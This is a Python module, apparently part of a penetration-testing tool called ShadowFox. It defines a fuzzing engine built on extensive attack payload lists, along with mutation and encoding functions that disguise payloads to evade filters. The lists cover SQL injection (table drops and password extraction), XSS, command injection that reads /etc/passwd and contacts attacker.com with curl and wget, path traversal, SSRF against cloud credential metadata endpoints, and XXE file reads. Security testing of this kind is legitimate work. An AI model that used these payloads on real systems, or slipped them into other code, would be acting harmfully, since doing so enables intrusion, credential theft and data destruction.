# shadowfox/engines/fuzz_engine.py

import itertools
import random
import string
import base64
import urllib.parse
import html
import json
import re
from typing import List, Dict, Generator, Any
import logging

class FuzzEngine:
    """
    Napredni FuzzEngine sa svim fuzzing tehnikama:
    - Dictionary-based fuzzing
    - Mutation-based fuzzing  
    - Grammar-based fuzzing
    - Smart payload generation
    - Context-aware fuzzing
    """
    
    def __init__(self, operator):
        self.operator = operator
        self.logger = logging.getLogger('FuzzEngine')
        
        # Osnovni charset-ovi za fuzzing
        self.charsets = {
            'alpha': string.ascii_letters,
            'numeric': string.digits,
            'special': '!@#$%^&*()_+-=[]{}|;:,.<>?',
            'whitespace': ' \t\n\r\x0b\x0c',
            'null_bytes': '\x00',
            'unicode': 'àáâãäåæçèéêëìíîïðñòóôõöøùúûüýþÿ',
            'control': ''.join(chr(i) for i in range(32)),
            'high_ascii': ''.join(chr(i) for i in range(128, 256))
        }
        
        # SQL Injection wordlists
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "' AND id IS NULL; --",
            "'; DROP TABLE users; --",
            "' UNION SELECT null-- ",
            "' UNION SELECT null,null-- ",
            "' UNION SELECT 1,2,3--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        
        # XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=\"alert('XSS')\">",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29')</script>"
        ]
        
        # Command Injection
        self.cmdi_payloads = [
            "; ls",
            "&& ls",
            "| ls",
            "; cat /etc/passwd",
            "&& cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "&& whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "; ping -c 4 127.0.0.1",
            "&& ping -c 4 127.0.0.1",
            "| ping -c 4 127.0.0.1",
            "; curl http://attacker.com",
            "; wget http://attacker.com",
            "; python -c \"import os; os.system('id')\"",
            "; perl -e \"system('id')\""
        ]
        
        # LFI/Directory Traversal
        self.lfi_payloads = [
            "../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
            "expect://whoami",
            "file:///etc/passwd",
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline"
        ]
        
        # SSRF payloads
        self.ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "dict://localhost:11211/",
            "sftp://localhost/",
            "ldap://localhost/",
            "gopher://localhost/",
            "http://[::1]/",
            "http://2130706433/",  # 127.0.0.1 in decimal
            "http://017700000001/"  # 127.0.0.1 in octal
        ]
        
        # XXE payloads
        self.xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY example "file:///etc/passwd"> ]><userInfo><firstName>John</firstName><lastName>&example;</lastName></userInfo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>'
        ]
    
    def generate_fuzzing_payloads(self, vuln_type: str, target_param: str = "", 
                                context: str = "", max_payloads: int = 100) -> List[str]:
        """
        Glavna funkcija za generisanje fuzz payload-a
        """
        payloads = []
        
        if vuln_type.upper() == "XSS":
            payloads.extend(self._fuzz_xss(context, max_payloads))
        elif vuln_type.upper() == "SQLI":
            payloads.extend(self._fuzz_sqli(context, max_payloads))
        elif vuln_type.upper() == "CMDI":
            payloads.extend(self._fuzz_cmdi(max_payloads))
        elif vuln_type.upper() == "LFI":
            payloads.extend(self._fuzz_lfi(max_payloads))
        elif vuln_type.upper() == "SSRF":
            payloads.extend(self._fuzz_ssrf(max_payloads))
        elif vuln_type.upper() == "XXE":
            payloads.extend(self._fuzz_xxe(max_payloads))
        else:
            # Generic fuzzing
            payloads.extend(self._generic_fuzz(max_payloads))
        
        # Mutation-based fuzzing na postojeće payload-e
        mutated = self._mutate_payloads(payloads[:20], max_mutations=max_payloads//2)
        payloads.extend(mutated)
        
        return payloads[:max_payloads]
    
    def _fuzz_xss(self, context: str = "", max_payloads: int = 50) -> List[str]:
        """XSS fuzzing sa context-aware pristupom"""
        payloads = list(self.xss_payloads)
        
        # Context-aware XSS payloads
        if "attribute" in context.lower():
            # Za HTML atribute
            payloads.extend([
                "\" onmouseover=\"alert('XSS')\"",
                "' onmouseover='alert(\"XSS\")'",
                "\" autofocus onfocus=\"alert('XSS')\"",
                "' autofocus onfocus='alert(\"XSS\")'"
            ])
        elif "javascript" in context.lower():
            # Za JavaScript kontekst
            payloads.extend([
                "'; alert('XSS'); var a='",
                "\"; alert('XSS'); var a=\"",
                "'; alert(String.fromCharCode(88,83,83)); var a='"
            ])
        elif "css" in context.lower():
            # Za CSS kontekst
            payloads.extend([
                "expression(alert('XSS'))",
                "url(javascript:alert('XSS'))",
                "\\65 xpression(alert('XSS'))"
            ])
        
        # Encoding variations
        encoded_payloads = []
        for payload in payloads[:10]:
            # URL encoding
            encoded_payloads.append(urllib.parse.quote(payload))
            # HTML encoding
            encoded_payloads.append(html.escape(payload))
            # Double URL encoding
            encoded_payloads.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        payloads.extend(encoded_payloads)
        return payloads[:max_payloads]
    
    def _fuzz_sqli(self, context: str = "", max_payloads: int = 50) -> List[str]:
        """SQL Injection fuzzing"""
        payloads = list(self.sqli_payloads)
        
        # Time-based blind SQLi
        time_payloads = []
        for sleep_func in ["SLEEP(5)", "pg_sleep(5)", "WAITFOR DELAY '00:00:05'", "BENCHMARK(5000000,MD5(1))"]:
            time_payloads.extend([
                f"' OR {sleep_func}--",
                f"' AND {sleep_func}--",
                f"'; SELECT {sleep_func}--"
            ])
        payloads.extend(time_payloads)
        
        # Boolean-based blind SQLi
        bool_payloads = [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--"
        ]
        payloads.extend(bool_payloads)
        
        # Union-based SQLi sa različitim brojem kolona
        for i in range(1, 11):
            columns = ",".join(["null"] * i)
            payloads.append(f"' UNION SELECT {columns}--")
        
        return payloads[:max_payloads]
    
    def _fuzz_cmdi(self, max_payloads: int = 30) -> List[str]:
        """Command Injection fuzzing"""
        payloads = list(self.cmdi_payloads)
        
        # Različiti separatori
        separators = [";", "&", "|", "&&", "||", "\n", "\r\n"]
        commands = ["whoami", "id", "pwd", "ls", "cat /etc/passwd"]
        
        for sep in separators:
            for cmd in commands:
                payloads.append(f"{sep} {cmd}")
                payloads.append(f"{sep}{cmd}")
        
        # Encoded verzije
        for payload in payloads[:10]:
            payloads.append(urllib.parse.quote(payload))
        
        return payloads[:max_payloads]
    
    def _fuzz_lfi(self, max_payloads: int = 30) -> List[str]:
        """LFI/Directory Traversal fuzzing"""
        payloads = list(self.lfi_payloads)
        
        # Različite dubine directory traversal-a
        for depth in range(1, 8):
            prefix = "../" * depth
            payloads.extend([
                f"{prefix}etc/passwd",
                f"{prefix}windows/system32/drivers/etc/hosts",
                f"{prefix}boot.ini"
            ])
        
        # Null byte variants
        null_payloads = []
        for payload in payloads[:10]:
            null_payloads.extend([
                payload + "%00",
                payload + "\x00",
                payload + "%00.jpg"
            ])
        payloads.extend(null_payloads)
        
        return payloads[:max_payloads]
    
    def _fuzz_ssrf(self, max_payloads: int = 25) -> List[str]:
        """SSRF fuzzing"""
        payloads = list(self.ssrf_payloads)
        
        # Cloud metadata endpoints
        cloud_endpoints = [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://100.100.100.200/latest/meta-data/"
        ]
        payloads.extend(cloud_endpoints)
        
        return payloads[:max_payloads]
    
    def _fuzz_xxe(self, max_payloads: int = 15) -> List[str]:
        """XXE fuzzing"""
        return self.xxe_payloads[:max_payloads]
    
    def _generic_fuzz(self, max_payloads: int = 50) -> List[str]:
        """Generic fuzzing za nepoznate parametre"""
        payloads = []
        
        # Buffer overflow patterns
        for length in [100, 500, 1000, 5000]:
            payloads.append("A" * length)
            payloads.append("1" * length)
            payloads.append("%s" * (length // 2))
        
        # Format string bugs
        format_strings = ["%x", "%s", "%p", "%d", "%n", "%x%x%x%x", "%s%s%s%s"]
        payloads.extend(format_strings)
        
        # Special characters
        special_chars = ["'", '"', "<", ">", "&", "%", "\\", "/", "?", "#"]
        payloads.extend(special_chars)
        
        # Null bytes i control characters
        payloads.extend(["\x00", "\x0a", "\x0d", "\x1a", "\xff"])
        
        return payloads[:max_payloads]
    
    def _mutate_payloads(self, base_payloads: List[str], max_mutations: int = 50) -> List[str]:
        """
        Mutation-based fuzzing - menja postojeće payload-e
        """
        mutations = []
        
        for payload in base_payloads:
            if len(mutations) >= max_mutations:
                break
                
            # Case mutations
            mutations.extend([
                payload.upper(),
                payload.lower(),
                payload.swapcase()
            ])
            
            # Character substitution
            substitutions = {
                'a': ['@', '4', 'A'],
                'e': ['3', 'E'],
                'i': ['1', '!', 'I'],
                'o': ['0', 'O'],
                's': ['$', '5', 'S']
            }
            
            mutated = payload
            for char, replacements in substitutions.items():
                for replacement in replacements:
                    mutations.append(mutated.replace(char, replacement))
            
            # Encoding mutations
            try:
                mutations.extend([
                    base64.b64encode(payload.encode()).decode(),
                    urllib.parse.quote(payload, safe=''),
                    payload.encode('unicode_escape').decode()
                ])
            except:
                pass
            
            # Repetition mutations
            mutations.extend([
                payload * 2,
                payload * 3,
                payload[:len(payload)//2] + payload + payload[len(payload)//2:]
            ])
        
        return mutations[:max_mutations]
    
    def smart_parameter_analysis(self, param_name: str, sample_value: str = "") -> str:
        """
        Pametna analiza parametra da odredi tip fuzzing-a
        """
        param_lower = param_name.lower()
        
        # SQL related
        if any(keyword in param_lower for keyword in ['id', 'user', 'search', 'query', 'name']):
            return "SQLI"
        
        # XSS related  
        if any(keyword in param_lower for keyword in ['comment', 'message', 'text', 'content', 'title']):
            return "XSS"
        
        # File related
        if any(keyword in param_lower for keyword in ['file', 'path', 'dir', 'include', 'page']):
            return "LFI"
        
        # URL related
        if any(keyword in param_lower for keyword in ['url', 'link', 'redirect', 'callback']):
            return "SSRF"
        
        # Command related
        if any(keyword in param_lower for keyword in ['cmd', 'command', 'exec', 'system']):
            return "CMDI"
        
        # XML related
        if 'xml' in param_lower or (sample_value and sample_value.strip().startswith('<')):
            return "XXE"
        
        return "GENERIC"
    
    def generate_smart_fuzzing_suite(self, parameters: Dict[str, str], max_per_param: int = 20) -> Dict[str, List[str]]:
        """
        Generiše pametnu fuzzing suite za sve parametre odjednom
        """
        fuzzing_suite = {}
        
        for param_name, sample_value in parameters.items():
            vuln_type = self.smart_parameter_analysis(param_name, sample_value)
            payloads = self.generate_fuzzing_payloads(vuln_type, param_name, max_payloads=max_per_param)
            
            fuzzing_suite[param_name] = {
                "type": vuln_type,
                "payloads": payloads,
                "total": len(payloads)
            }
            
            self.logger.info(f"Generisano {len(payloads)} payloads za {param_name} ({vuln_type})")
        
        return fuzzing_suite

# Test funkcionalnosti
if __name__ == "__main__":
    from core.operator import ShadowFoxOperator
    
    # Test
    op = ShadowFoxOperator()
    fuzzer = FuzzEngine(op)
    
    # Test XSS fuzzing
    xss_payloads = fuzzer.generate_fuzzing_payloads("XSS", context="attribute", max_payloads=10)
    print("XSS Payloads:")
    for payload in xss_payloads[:5]:
        print(f"  {payload}")
    
    # Test smart parameter analysis
    params = {
        "user_id": "123",
        "comment": "Hello world",
        "file_path": "/home/user/file.txt",
        "redirect_url": "https://example.com"
    }
    
    suite = fuzzer.generate_smart_fuzzing_suite(params)
    print(f"\nSmart Fuzzing Suite: {len(suite)} parameters analyzed")
    for param, data in suite.items():
        print(f"  {param}: {data['type']} ({data['total']} payloads)")
